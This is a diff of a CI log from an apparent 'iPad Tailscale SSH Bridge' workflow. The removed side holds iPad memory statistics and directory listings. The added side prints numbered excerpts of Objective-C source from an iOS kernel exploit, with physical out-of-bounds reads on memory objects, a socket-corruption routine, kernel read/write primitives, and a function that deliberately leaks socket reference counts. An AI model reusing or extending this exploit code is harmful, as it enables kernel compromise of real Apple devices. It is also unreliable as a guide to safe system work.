@@ -1,7 +1,7 @@
 iPad Tailscale SSH Bridge
-run_id=30150411788
-run_url=https://github.com/NightVibes33/Codex-DEB-Test/actions/runs/30150411788
-commit=263e95bb29b9ebacbc42063938fc46ddce4773dd
+run_id=30150632593
+run_url=https://github.com/NightVibes33/Codex-DEB-Test/actions/runs/30150632593
+commit=8ced28f5f79cd0f54f669615cc4ec4809a4c74da
 environment=TAILSCALE_AUTHKEY-
 validate=success
 tailscale=success
@@ -9,103 +9,103 @@ install_ssh=success
 ssh=success
 
 --- sanitized SSH output ---
-=== VM statistics ===
-Mach Virtual Memory Statistics: (page size of 16384 bytes)
-Pages free:                                 997.
-Pages active:                             39376.
-Pages inactive:                           38952.
-Pages speculative:                          530.
-Pages throttled:                              0.
-Pages wired down:                         25348.
-Pages purgeable:                            977.
-"Translation faults":                  29598950.
-Pages copy-on-write:                     726015.
-Pages zero filled:                     11888709.
-Pages reactivated:                      5598146.
-Pages purged:                            301567.
-File-backed pages:                        42426.
-Anonymous pages:                          36432.
-Pages stored in compressor:               64204.
-Pages occupied by compressor:             21459.
-Decompressions:                         3653394.
-Compressions:                           4512528.
-Pageins:                                4822727.
-Pageouts:                                 60565.
-Swapins:                                  19230.
-Swapouts:                                 40523.
-=== Dynamic pager availability ===
-dynamic_pager_binary=missing
-Could not find service "com.apple.dynamic_pager" in domain for system
-=== VM storage directories ===
-path=/private/var/vm
-total 131072
-drwxr-xr-x  3 root wheel        96 Jul 24 22:37 .
-drwxr-xr-x 54 root wheel      1728 Jul 24 01:05 ..
--rw-------  1 root wheel 134217728 Jul 24 00:40 swapfile0
-path=/var/vm
-total 131072
-drwxr-xr-x  3 root wheel        96 Jul 24 22:37 .
-drwxr-xr-x 54 root wheel      1728 Jul 24 01:05 ..
--rw-------  1 root wheel 134217728 Jul 24 00:40 swapfile0
-path=/private/var/mobile/Library/Caches
-total 148
-drwx------ 145 mobile mobile  4640 Jul 25 02:56 .
-drwx--x--x 150 mobile mobile  4800 Jul 24 01:16 ..
--rw-r--r--   1 mobile mobile     0 Oct 25  2025 .com.apple.persistentconnection.settings.lock.lock
--rw-r--r--   1 root   wheel   9328 Mar 20  2025 Checkpoint.plist
-drwxr-xr-x  62 mobile mobile  1984 Jul 24 23:12 CloudKit
--rw-r--r--   1 mobile mobile  1020 Jan  5  2026 DateFormats.plist
-drwxr-xr-x   4 mobile mobile   128 Jan  4  2026 FamilyCircle
--rw-r--r--   1 mobile mobile  7239 Jul 19 23:35 FamilyMarqueeDarkMode-8D7A52EF-07F5-4DCB-AC18-1BB9130BCF94@2x.png
--rw-r--r--   1 mobile mobile  7239 Jul 19 23:35 FamilyMarqueeLightMode-8D7A52EF-07F5-4DCB-AC18-1BB9130BCF94@2x.png
--rw-r--r--   1 mobile mobile 53248 Jan  9  2026 GDFileManagerCache.sqlite
--rw-r--r--   1 mobile mobile 32768 Jan  9  2026 GDFileManagerCache.sqlite-shm
--rw-r--r--   1 mobile mobile     0 Jan  9  2026 GDFileManagerCache.sqlite-wal
-drwx--x--x   7 mobile mobile   224 Jan 11  2026 GameKit
-drwxr-xr-x  15 mobile mobile   480 Jul 25 00:12 GeoServices
--rw-r--r--   1 mobile mobile    36 Jan  4  2026 INSTALLATION
-drwxr-xr-x   4 mobile mobile   128 Jan 10  2026 ImageTables
-drwxr-xr-x   6 mobile mobile   192 Jul 25 00:12 MappedImageCache
-drwxr-xr-x  10 mobile mobile   320 Jan 12  2026 PPZebraBundle.bundle
-drwxr-xr-x   6 mobile mobile   192 Jul 25 03:02 PassKit
-drwx------   3 mobile mobile    96 Jan  4  2026 SentryCrash
-drwxr-xr-x  12 mobile mobile   384 May  1 10:40 TelephonyUI-9
-drwx------   3 mobile mobile    96 Jul 25 00:12 VoiceServices
-drwxr-xr-x   2 mobile mobile    64 Jul 25 00:12 VoiceTrigger
-drwxr-xr-x   3 mobile mobile    96 Jan 11  2026 cache
-drwxr-xr-x   6 mobile mobile   192 Jan  5  2026 com.apple.AppleAccount
-drwxr-xr-x  12 mobile mobile   384 Jul 22 23:16 com.apple.AppleMediaServices
-drwxr-xr-x   2 mobile mobile    64 Jul 24 22:20 com.apple.AssistantServices
-drwxr-xr-x   3 mobile mobile    96 Jan 13  2026 com.apple.AvatarKit
-drwxr-xr-x   3 mobile mobile    96 Jan  5  2026 com.apple.ClipServices
-drwxr-xr-x   6 mobile mobile   192 Jan 10  2026 com.apple.ClipServices.clipserviced
-drwxr-xr-x   6 mobile mobile   192 Jan 19  2026 com.apple.DeviceCheckInternal
-drwxr-xr-x   6 mobile mobile   192 Jan  4  2026 com.apple.FileProviderDaemon.AppStoreService
-drwxr-xr-x   9 mobile mobile   288 Jan  9  2026 com.apple.HomeKit
-drwxr-xr-x   4 mobile mobile   128 Jan  7  2026 com.apple.MTLAssetUpgraderD
-drwxr-xr-x   4 mobile mobile   128 Jan  7  2026 com.apple.MapKit.SnapshotService
-drwxr-xr-x   4 mobile mobile   128 Jul 23 08:15 com.apple.MobileSMS
-drwxr-xr-x   6 mobile mobile   192 Jan  8  2026 com.apple.NewDeviceOutreach
-drwxr-xr-x   5 mobile mobile   160 Jul 24 02:51 com.apple.Pasteboard
-drwxr-xr-x   7 mobile mobile   224 Jul 25 00:13 com.apple.Preferences
-=== Filesystem capacity ===
-Filesystem                                                                          Size   Used  Avail Capacity iused      ifree %iused  Mounted on
-com.apple.os.update-8579078043F0FC7B23462C6FC23605D3A3BB1E07@/dev/disk1s1           30Gi  4.2Gi  5.3Gi    45%  237568   55118120    0%   /
-/dev/disk1s2                                                                        30Gi   16Gi  5.3Gi    76%  156606   55118120    0%   /private/var
-com.apple.os.update-8579078043F0FC7B23462C6FC23605D3A3BB1E07@/dev/disk1s1 on / (apfs, sealed, local, nosuid, read-only, journaled, noatime)
-devfs on /dev (devfs, local, nosuid, nobrowse)
-/dev/md0 on /cores (hfs, local, nosuid)
-/dev/disk1s5 on /private/preboot (apfs, local, nosuid, journaled, noatime)
-/dev/disk3 on /cores/binpack (hfs, local, nosuid, read-only)
-/dev/disk4 on /cores/binpack/Applications (hfs, local, nosuid, read-only)
-/dev/disk1s3 on /private/xarts (apfs, local, nodev, nosuid, journaled, noatime, nobrowse)
-/private/preboot/8579078043F0FC7B23462C6FC23605D3A3BB1E07/usr/standalone/firmware on /usr/standalone/firmware (bindfs, local, nodev, nosuid, read-only, nobrowse)
-/dev/disk1s2 on /private/var (apfs, local, nodev, nosuid, journaled, noatime, protect)
-/dev/disk1s6 on /private/var/MobileSoftwareUpdate (apfs, local, nodev, nosuid, journaled, noatime, nobrowse)
-/dev/disk1s4 on /private/var/hardware (apfs, local, nodev, nosuid, journaled, noatime, nobrowse)
-/private/var/hardware/FactoryData/System/Library/Caches/com.apple.factorydata on /System/Library/Caches/com.apple.factorydata (bindfs, local, nodev, nosuid, read-only, nobrowse)
-=== Current pressure evidence ===
-process_count=309
-node_count=0
-diagnostic=read-only-no-memory-settings-changed
+0778:         }
+0779:         NSMutableArray<NSNumber *> *searchMappings = [NSMutableArray new];
+0780:         for (uint64_t s = 0; s < searchMappingNum; s++) {
+0781:             mach_vm_address_t searchMappingAddress = 0;
+0782:             kr = mach_vm_allocate(mach_task_self(), &searchMappingAddress, searchMappingSize, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
+0783:             if (kr != KERN_SUCCESS) {
+0784:                 printf("[-] mach_vm_allocate failed!!! (%s)\n", mach_error_string(kr));
+0785:                 FAILURE(0);
+anchor='surface_mlock(searchMappingAddress' hits=1 lines=[823]
+--- surface_mlock(searchMappingAddress context 815-857 ---
+0815:             printf("[i] looking in search mapping: %llu\n", s);
+0816:             mach_port_t memoryObject = 0;
+0817:             mach_vm_size_t memoryObjectSize = searchMappingSize;
+0818:             kr = mach_make_memory_entry_64(mach_task_self(), &memoryObjectSize, searchMappingAddress, VM_PROT_DEFAULT, &memoryObject, 0);
+0819:             if (kr != KERN_SUCCESS) {
+0820:                 printf("[-] mach_make_memory_entry_64 failed!!!");
+0821:                 FAILURE(0);
+0822:             }
+0823:             surface_mlock(searchMappingAddress, searchMappingSize);
+0824:             mach_vm_offset_t seekingOffset = 0;
+0825:             // fix mach_vm_map err on free thread, we'd try to map outside mo
+0826:             while (seekingOffset <= searchMappingSize - pcSize) {
+0827:                 kr = physical_oob_read_mo(memoryObject, seekingOffset, OOB_SIZE, OOB_OFFSET, readBuffer);
+0828:                 if (kr == KERN_SUCCESS) {
+0829:                     if (find_and_corrupt_socket(memoryObject, seekingOffset, readBuffer, writeBuffer, targetInpGencntList, false) == KERN_SUCCESS) {
+0830:                         success = true;
+0831:                         break;
+0832:                     }
+0833:                 }
+0834:                 seekingOffset += PAGE_SIZE;
+0835:             }
+0836:             kr = mach_port_deallocate(mach_task_self(), memoryObject);
+0837:             if (kr != KERN_SUCCESS) {
+0838:                 printf("[-] mach_port_deallocate failed!!!\n");
+0839:                 FAILURE(0);
+0840:             }
+0841:             if (success == true) {
+0842:                 break;
+0843:             }
+0844:         }
+0845:         sockets_release(socketPorts, socketPcbIds);
+0846:         for (uint64_t s = 0; s < searchMappingNum; s++) {
+0847:             mach_vm_address_t searchMappingAddress = searchMappings.lastObject.unsignedLongLongValue;
+0848:             [searchMappings removeLastObject];
+0849:             kr = mach_vm_deallocate(mach_task_self(), searchMappingAddress, searchMappingSize);
+0850:         }
+0851:         if (isA18Device) {
+0852:             surface_munlock(wiredMapping, wiredMappingSize);
+0853:         }
+0854:         if (success == true) {
+0855:             break;
+0856:         }
+0857:     }
+anchor='sockets_release(socketPorts' hits=1 lines=[845]
+--- sockets_release(socketPorts context 837-879 ---
+0837:             if (kr != KERN_SUCCESS) {
+0838:                 printf("[-] mach_port_deallocate failed!!!\n");
+0839:                 FAILURE(0);
+0840:             }
+0841:             if (success == true) {
+0842:                 break;
+0843:             }
+0844:         }
+0845:         sockets_release(socketPorts, socketPcbIds);
+0846:         for (uint64_t s = 0; s < searchMappingNum; s++) {
+0847:             mach_vm_address_t searchMappingAddress = searchMappings.lastObject.unsignedLongLongValue;
+0848:             [searchMappings removeLastObject];
+0849:             kr = mach_vm_deallocate(mach_task_self(), searchMappingAddress, searchMappingSize);
+0850:         }
+0851:         if (isA18Device) {
+0852:             surface_munlock(wiredMapping, wiredMappingSize);
+0853:         }
+0854:         if (success == true) {
+0855:             break;
+0856:         }
+0857:     }
+0858: }
+0859: 
+0860: void pe_v2(void)
+0861: {
+0862:     // TODO: Implement
+0863: }
+0864: 
+0865: void krw_sockets_leak_forever(void)
+0866: {
+0867:     uint64_t controlSocketAddr = early_kread64(controlSocketPcb + koffsetof(inpcb, socket));
+0868:     uint64_t rwSocketAddr = early_kread64(rwSocketPcb + koffsetof(inpcb, socket));
+0869: 
+0870:     if (!controlSocketAddr || !rwSocketAddr) {
+0871:         printf("[-] Couldn't find controlSocketAddr || rwSocketAddr\n");
+0872:         FAILURE(0);
+0873:     }
+0874: 
+0875:     uint64_t controlSocketSoCount = early_kread64(controlSocketAddr + koffsetof(socket, usecount));
+0876:     uint64_t rwSocketSoCount = early_kread64(rwSocketAddr + koffsetof(socket, usecount));
+0877:     early_kwrite64(controlSocketAddr + koffsetof(socket, usecount), controlSocketSoCount + 0x0000100100001001);
+0878:     early_kwrite64(rwSocketAddr + koffsetof(socket, usecount), rwSocketSoCount + 0x0000100100001001);
+0879: 
+inspection=complete
 ssh_exit_code=0
